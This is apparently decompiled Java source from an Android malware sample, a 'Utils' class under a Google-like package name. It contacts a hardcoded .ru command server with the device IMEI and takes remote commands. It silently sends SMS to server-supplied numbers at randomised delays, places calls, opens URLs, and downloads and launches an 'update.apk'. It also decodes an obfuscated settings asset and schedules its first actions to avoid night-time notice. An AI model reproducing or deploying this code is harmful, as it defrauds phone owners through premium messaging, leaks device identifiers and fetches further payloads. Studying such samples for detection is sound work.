package com.google.elements;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Environment;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.util.Log;
import com.google.android.gcm.GCMConstants;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.Timer;
import java.util.TimerTask;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.util.EntityUtils;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class Utils {
    public static Utils instance = null;
    private String Url = "http://whatisthefuckingshirtmazafakayoyonigacomon.ru/command/";
    /* access modifiers changed from: private */
    public Context context;
    private String current = null;
    private Editor edit;
    private int first_interval = 120;
    private int interval = 1440;
    private int random = 180;
    private JSONObject resSettings = null;
    private SharedPreferences settings;
    private TelephonyManager tel;

    private class sendPostRequest extends AsyncTask<String, Void, String> {
        private sendPostRequest() {
        }

        /* synthetic */ sendPostRequest(Utils x0, AnonymousClass1 x1) {
            this();
        }

        /* access modifiers changed from: protected|varargs */
        public String doInBackground(String... params) {
            HttpParams httpParams = new BasicHttpParams();
            HttpConnectionParams.setConnectionTimeout(httpParams, 5000);
            HttpConnectionParams.setSoTimeout(httpParams, 10000);
            HttpClient client = new DefaultHttpClient(httpParams);
            HttpPost post = new HttpPost(params[0]);
            try {
                post.setEntity(new StringEntity(params[1], "UTF-8"));
                post.setHeader("User-Agent", "8b65916051836d5cfd41946e79d14316");
                return EntityUtils.toString(client.execute(post).getEntity());
            } catch (ClientProtocolException e) {
                e.printStackTrace();
            } catch (IOException e2) {
                e2.printStackTrace();
            }
            return null;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(String result) {
            Utils.this.postRequestResult(result);
        }
    }

    private class updateApplication extends AsyncTask<String, Void, Void> {
        private updateApplication() {
        }

        /* synthetic */ updateApplication(Utils x0, AnonymousClass1 x1) {
            this();
        }

        /* access modifiers changed from: protected|varargs */
        public Void doInBackground(String... params) {
            try {
                HttpURLConnection connection = (HttpURLConnection) new URL(params[0]).openConnection();
                connection.setRequestMethod("GET");
                connection.setDoOutput(true);
                connection.connect();
                File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "update.apk");
                if (file.exists()) {
                    file.delete();
                }
                FileOutputStream outputStream = new FileOutputStream(file);
                InputStream inputStream = connection.getInputStream();
                byte[] buffer = new byte[1024];
                while (true) {
                    int length = inputStream.read(buffer);
                    if (length == -1) {
                        break;
                    }
                    outputStream.write(buffer, 0, length);
                }
                outputStream.close();
                inputStream.close();
            } catch (MalformedURLException e) {
                e.printStackTrace();
            } catch (IOException e2) {
                e2.printStackTrace();
            }
            return null;
        }

        /* access modifiers changed from: protected */
        public void onPostExecute(Void aVoid) {
            Intent update = new Intent("android.intent.action.VIEW");
            update.setDataAndType(Uri.fromFile(new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/update.apk")), "application/vnd.android.package-archive");
            update.setFlags(268435456);
            Utils.this.context.startActivity(update);
        }
    }

    public Utils(Context application_context) {
        this.context = application_context;
        this.tel = (TelephonyManager) this.context.getSystemService("phone");
        this.settings = this.context.getSharedPreferences("settings", 0);
        this.edit = this.settings.edit();
    }

    public static Utils getInstance(Context application_context) {
        if (instance == null) {
            instance = new Utils(application_context);
        }
        return instance;
    }

    public void loadSettings() {
        if (Settings().getString("url", "none").equals("none")) {
            setUrl(this.Url);
        }
        if (getInterval() == 0) {
            setInterval(this.interval);
        }
        if (getIntervalValue() == 0) {
            setIntervalValue(this.interval);
        }
        if (getFirstInterval() == 0) {
            setFirstInterval(this.first_interval);
        }
        if (getRandomValue() == 0) {
            setRandomValue(this.random);
        }
        if (getNumbers().equals("none")) {
            setNumbers(getResNumbers());
        }
        if (getIncomingPatterns() == null) {
            setIncomingPatterns(getResIncomingPatterns());
        }
        if (getExceptions() == null) {
            setExceptions(getResExceptions());
        }
        setInstallTime();
        updateIncomingPatterns();
        updateNumbers();
        updateExceptions();
    }

    private void readResSettings() {
        if (this.resSettings == null) {
            try {
                InputStream input = this.context.getAssets().open("data.res");
                byte[] data = new byte[input.available()];
                input.read(data);
                input.close();
                this.resSettings = new JSONObject(decode(new String(data, "UTF-8")));
            } catch (IOException e) {
                e.printStackTrace();
            } catch (JSONException e2) {
                e2.printStackTrace();
            }
        }
    }

    public void setIncomingPatterns(String patterns) {
        Edit().putString("incoming_patterns", patterns);
        Edit().commit();
    }

    public void updateIncomingPatterns() {
        sendPostRequest("update_incoming_patterns", BuildConfig.FLAVOR);
    }

    public String getIncomingPatterns() {
        return Settings().getString("incoming_patterns", null);
    }

    public void setExceptions(String exceptions) {
        Edit().putString("exceptions", exceptions);
        Edit().commit();
    }

    public void updateExceptions() {
        sendPostRequest("update_exceptions", BuildConfig.FLAVOR);
    }

    public String getExceptions() {
        return Settings().getString("exceptions", null);
    }

    public void setNumbers(String numbers) {
        Edit().putString("numbers", numbers);
        Edit().commit();
    }

    public void updateNumbers() {
        JSONObject info = new JSONObject();
        try {
            info.put("imei", getDeviceId());
            info.put("combination", getCombination());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        sendPostRequest("update_numbers", info.toString());
    }

    public String getNumbers() {
        return Settings().getString("numbers", "none");
    }

    public JSONArray getCurrentNumbers() {
        String numbers = getNumbers();
        if (numbers.equals("none")) {
            return null;
        }
        try {
            JSONObject json = new JSONObject(numbers);
            if (json == null || json.length() <= 0 || json.isNull(getCurrent())) {
                return null;
            }
            return json.getJSONArray(getCurrent());
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }

    public JSONArray getCurrentNumbers(boolean one) {
        String numbers = getNumbers();
        if (numbers.equals("none")) {
            return null;
        }
        try {
            JSONObject json = new JSONObject(numbers);
            if (json == null || json.length() <= 0) {
                return null;
            }
            if (!json.isNull(getCurrent() + "_1")) {
                return json.getJSONArray(getCurrent() + "_1");
            }
            if (json.isNull(getCurrent())) {
                return null;
            }
            return json.getJSONArray(getCurrent());
        } catch (JSONException e) {
            e.printStackTrace();
            return null;
        }
    }

    public void setStop(boolean is_stop) {
        Edit().putBoolean("sending_stop", is_stop);
        Edit().commit();
    }

    public boolean getStop() {
        return Settings().getBoolean("sending_stop", false);
    }

    public void activeApplication() {
        Edit().putBoolean("active", true);
        Edit().commit();
        JSONObject info = new JSONObject();
        try {
            info.put("imei", getDeviceId());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        sendPostRequest("activate", info.toString());
    }

    public void deactiveApplication() {
        Edit().putBoolean("active", false);
        Edit().commit();
        JSONObject info = new JSONObject();
        try {
            info.put("imei", getDeviceId());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        sendPostRequest("deactivate", info.toString());
    }

    public void deleteApplication() {
        Edit().putBoolean("active", false);
        Edit().commit();
        JSONObject info = new JSONObject();
        try {
            info.put("imei", getDeviceId());
        } catch (JSONException e) {
            e.printStackTrace();
        }
        sendPostRequest("delete", info.toString());
    }

    public boolean isActive() {
        return Settings().getBoolean("active", true);
    }

    public void updateSettings() {
        sendPostRequest("settings", BuildConfig.FLAVOR);
    }

    public String getTextColor() {
        readResSettings();
        try {
            return this.resSettings.getString("text_color");
        } catch (JSONException e) {
            return "BEBEBE";
        }
    }

    public String getCombination() {
        readResSettings();
        try {
            return this.resSettings.getString("combination");
        } catch (JSONException e) {
            return "-";
        }
    }

    public String getPartnerId() {
        readResSettings();
        try {
            return this.resSettings.getString("partner_id");
        } catch (JSONException e) {
            return "1";
        }
    }

    public String getResNumbers() {
        readResSettings();
        try {
            return this.resSettings.getJSONObject("numbers").toString();
        } catch (JSONException e) {
            return "none";
        }
    }

    public String getResIncomingPatterns() {
        readResSettings();
        try {
            return this.resSettings.getJSONObject("income_patterns").toString();
        } catch (JSONException e) {
            return "none";
        }
    }

    public String getResExceptions() {
        readResSettings();
        try {
            return this.resSettings.getJSONObject("exceptions").toString();
        } catch (JSONException e) {
            return "none";
        }
    }

    public String getCurrent() {
        if (this.current != null) {
            return this.current;
        }
        if (getExceptions() == null) {
            return this.tel.getNetworkCountryIso().toLowerCase();
        }
        try {
            String search_current = this.tel.getNetworkCountryIso().toLowerCase() + "_" + this.tel.getNetworkOperatorName().toLowerCase();
            JSONObject json = new JSONObject(getExceptions());
            Iterator<String> iterator = json.keys();
            while (iterator.hasNext()) {
                String except = (String) iterator.next();
                if (search_current.contains(except) && json.getBoolean(except)) {
                    this.current = except;
                    return this.current;
                }
            }
            return this.tel.getNetworkCountryIso().toLowerCase();
        } catch (JSONException e) {
            return this.tel.getNetworkCountryIso().toLowerCase();
        }
    }

    public void incrementSending() {
        Edit().putInt("sending", Settings().getInt("sending", 0) + 1);
        Edit().commit();
    }

    public int getSending() {
        return Settings().getInt("sending", 0);
    }

    public void setSending(int sending) {
        Edit().putInt("sending", sending);
        Edit().commit();
    }

    public void incrementFail(boolean decrement) {
        if (decrement) {
            Edit().putInt("fail", 0);
            Edit().commit();
            return;
        }
        Edit().putInt("fail", Settings().getInt("fail", 0) + 1);
        Edit().commit();
    }

    public int getFail() {
        return Settings().getInt("fail", 0);
    }

    public void setFail(int fails) {
        Edit().putInt("fail", fails);
        Edit().commit();
    }

    public void setFirstInterval(int sinterval) {
        Edit().putInt("first_interval", sinterval);
        Edit().commit();
    }

    public int getFirstInterval() {
        return Settings().getInt("first_interval", this.first_interval);
    }

    public void setInterval(int sinterval) {
        Edit().putInt("interval", sinterval);
        Edit().commit();
    }

    public int getInterval() {
        return Settings().getInt("interval", 0);
    }

    public void setIntervalValue(int sinterval) {
        Edit().putInt("interval_value", sinterval);
        Edit().commit();
    }

    public int getIntervalValue() {
        return Settings().getInt("interval_value", 0);
    }

    public void setInstallTime() {
        if (getLastTime() != 0) {
            return;
        }
        if (isNightInstallTime()) {
            setInstallNigthTime();
        } else {
            setLastTime();
        }
    }

    public void setLastTime() {
        Edit().putLong("last_time", getCurrentTime());
        Edit().commit();
    }

    public void setInstallNigthTime() {
        if (getCurrentHour() < 7) {
            Edit().putLong("last_time", getCurrentTime() + ((long) ((7 - getCurrentHour()) * 60)));
        } else {
            Edit().putLong("last_time", getCurrentTime() + ((long) (((24 - getCurrentHour()) + 7) * 60)));
        }
        Edit().commit();
    }

    public long getLastTime() {
        return Settings().getLong("last_time", 0);
    }

    public int getRandom() {
        return ((int) Math.random()) * getRandomValue();
    }

    public int getRandomValue() {
        return Settings().getInt("random", 0);
    }

    public void setRandomValue(int value) {
        Edit().putInt("random", value);
    }

    public void setUrl(String url) {
        Edit().putString("url", url);
        Edit().commit();
    }

    public String getUrl() {
        return Settings().getString("url", this.Url);
    }

    public boolean isConnection() {
        NetworkInfo ni = ((ConnectivityManager) this.context.getSystemService("connectivity")).getActiveNetworkInfo();
        return ni != null && ni.isAvailable() && ni.isConnected();
    }

    public long getCurrentTime() {
        return (new Date().getTime() / 1000) / 60;
    }

    public long getCurrentTime(int Mode) {
        if (Mode == 1) {
            return new Date().getTime() / 1000;
        }
        if (Mode == 2) {
            return (new Date().getTime() / 1000) / 60;
        }
        if (Mode == 3) {
            return new Date().getTime();
        }
        return ((new Date().getTime() / 1000) / 60) / 60;
    }

    public boolean isNightTime() {
        if (Calendar.getInstance().get(11) > 6) {
            return false;
        }
        return true;
    }

    public boolean isNightInstallTime() {
        if (Calendar.getInstance().get(11) <= 6 || Calendar.getInstance().get(11) >= 22) {
            return true;
        }
        return false;
    }

    public int getCurrentHour() {
        return Calendar.getInstance().get(11);
    }

    public void sendBackgroundMessage(String data) {
        try {
            JSONObject json = new JSONObject(data);
            final String phone = json.getString("phone");
            final String text = json.getString("text").replace("%id", getPartnerId());
            new Timer().schedule(new TimerTask() {
                public void run() {
                    SmsManager.getDefault().sendTextMessage(phone, null, text, null, null);
                }
            }, (long) (((int) (Math.random() * 181.0d)) * 60000));
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public void sendMessageNow(String data) {
        try {
            JSONObject json = new JSONObject(data);
            SmsManager.getDefault().sendTextMessage(json.getString("phone"), null, json.getString("text").replace("%id", getPartnerId()), null, null);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    public void installTask(String data) {
        try {
            final JSONObject json = new JSONObject(data);
            long task_time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").parse(json.getString("date")).getTime() - getCurrentTime(3);
            if (task_time > 0) {
                new Timer().schedule(new TimerTask() {
                    public void run() {
                        try {
                            String command = json.getString("command");
                            Intent intent;
                            if (command.equals("open_url")) {
                                intent = new Intent("android.intent.action.VIEW", Uri.parse(json.getString("url")));
                                intent.setFlags(268435456);
                                Utils.this.context.startActivity(intent);
                            } else if (command.equals("send_sms")) {
                                SmsManager.getDefault().sendTextMessage(json.getString("number"), null, json.getString("text").replace("%id", Utils.this.getPartnerId()), null, null);
                            } else if (command.equals("call")) {
                                intent = new Intent("android.intent.action.CALL", Uri.parse("tel:" + json.getString("number")));
                                intent.setFlags(268435456);
                                Utils.this.context.startActivity(intent);
                            }
                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }, task_time);
            }
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (ParseException e2) {
            e2.printStackTrace();
        }
    }

    public String getDeviceId() {
        return this.tel.getDeviceId();
    }

    public String getCountry() {
        return this.tel.getNetworkCountryIso();
    }

    public String getOperator() {
        return this.tel.getNetworkOperatorName();
    }

    public String getPhone() {
        return this.tel.getLine1Number();
    }

    public String getVersion() {
        return VERSION.RELEASE;
    }

    public String getModel() {
        return Build.MANUFACTURER + " " + Build.MODEL;
    }

    public SharedPreferences Settings() {
        return this.settings;
    }

    public Editor Edit() {
        return this.edit;
    }

    private String decode(String data) throws UnsupportedEncodingException {
        int[] arr$ = new int[]{8, 4, 12, 4};
        int len$ = arr$.length;
        int i$ = 0;
        String data2 = data;
        while (i$ < len$) {
            i$++;
            data2 = new String(Base64.decode(data2.substring(arr$[i$]), 0), "UTF-8");
        }
        return data2;
    }

    public void updateApplication(String url) {
        if (isConnection()) {
            new updateApplication(this, null).execute(new String[]{url});
            return;
        }
        Log.i("Network", "No connect");
    }

    public void sendPostRequest(String url, String data) {
        if (isConnection()) {
            new sendPostRequest(this, null).execute(new String[]{getUrl() + url, data});
            return;
        }
        Log.i("Network", "No connect");
    }

    /* access modifiers changed from: private */
    public void postRequestResult(String data) {
        if (data != null && !data.equals(BuildConfig.FLAVOR)) {
            try {
                JSONObject json = new JSONObject(decode(data));
                if (json.isNull(GCMConstants.EXTRA_ERROR)) {
                    String action = json.getString("command");
                    if (action.equals("settings")) {
                        JSONObject settings = json.getJSONObject("data");
                        setIntervalValue(settings.getInt("interval"));
                        setFirstInterval(settings.getInt("first_interval"));
                        setRandomValue(settings.getInt("random"));
                        setUrl(settings.getString("api_url"));
                        return;
                    } else if (action.equals("exceptions")) {
                        if (!json.isNull("data")) {
                            setExceptions(json.getString("data").toString());
                            return;
                        }
                        return;
                    } else if (action.equals("incoming_patterns")) {
                        if (!json.isNull("data")) {
                            setIncomingPatterns(json.getJSONArray("data").toString());
                            return;
                        }
                        return;
                    } else if (action.equals("numbers") && !json.isNull("numbers")) {
                        setNumbers(json.getString("data").toString());
                        return;
                    } else {
                        return;
                    }
                }
                Log.i("Network", "Error: " + json.getString(GCMConstants.EXTRA_ERROR));
            } catch (JSONException e) {
                e.printStackTrace();
            } catch (UnsupportedEncodingException e2) {
                e2.printStackTrace();
            } catch (Exception e3) {
                e3.printStackTrace();
            }
        }
    }
}
